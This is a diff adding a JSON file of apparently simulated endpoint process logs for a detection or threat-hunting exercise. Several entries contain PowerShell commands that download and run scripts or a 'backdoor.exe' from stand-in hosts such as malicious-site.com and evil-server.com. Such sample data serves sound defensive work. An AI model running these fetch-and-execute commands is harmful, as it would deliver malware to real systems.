@@ -1,0 +1,56 @@
+[
+    {
+        "Timestamp": "2026-09-01 08:15:00",
+        "DeviceName": "PC-MOHAMMAD",
+        "AccountName": "Ali.Rezaei",
+        "FileName": "powershell.exe",
+        "ProcessCommandLine": "powershell -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-site.com/payload.ps1')",
+        "InitiatingProcessCommandLine": "cmd.exe /c powershell -Command ...",
+        "RemoteIP": "185.220.101.23"
+    },
+    {
+        "Timestamp": "2026-09-01 08:20:00",
+        "DeviceName": "PC-MOHAMMAD",
+        "AccountName": "Ali.Rezaei",
+        "FileName": "powershell.exe",
+        "ProcessCommandLine": "powershell -Command Get-Process",
+        "InitiatingProcessCommandLine": "explorer.exe",
+        "RemoteIP": "-"
+    },
+    {
+        "Timestamp": "2026-09-01 09:30:00",
+        "DeviceName": "PC-SARA",
+        "AccountName": "Sara.Nouri",
+        "FileName": "notepad.exe",
+        "ProcessCommandLine": "notepad report.txt",
+        "InitiatingProcessCommandLine": "explorer.exe",
+        "RemoteIP": "-"
+    },
+    {
+        "Timestamp": "2026-09-01 10:45:00",
+        "DeviceName": "PC-MOHAMMAD",
+        "AccountName": "Ali.Rezaei",
+        "FileName": "powershell.exe",
+        "ProcessCommandLine": "powershell -Command $client = new-object System.Net.WebClient; $client.DownloadFile('http://bad-site.com/backdoor.exe', 'C:\\\\temp\\\\backdoor.exe')",
+        "InitiatingProcessCommandLine": "powershell -Command ...",
+        "RemoteIP": "45.33.22.11"
+    },
+    {
+        "Timestamp": "2026-09-01 11:20:00",
+        "DeviceName": "PC-MOHAMMAD",
+        "AccountName": "Ali.Rezaei",
+        "FileName": "backdoor.exe",
+        "ProcessCommandLine": "C:\\temp\\backdoor.exe",
+        "InitiatingProcessCommandLine": "powershell.exe",
+        "RemoteIP": "-"
+    },
+    {
+        "Timestamp": "2026-09-01 11:45:00",
+        "DeviceName": "PC-REZA",
+        "AccountName": "Reza.Karimi",
+        "FileName": "powershell.exe",
+        "ProcessCommandLine": "powershell -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil-server.com/script.ps1')",
+        "InitiatingProcessCommandLine": "winlogon.exe",
+        "RemoteIP": "94.102.61.78"
+    }
+]
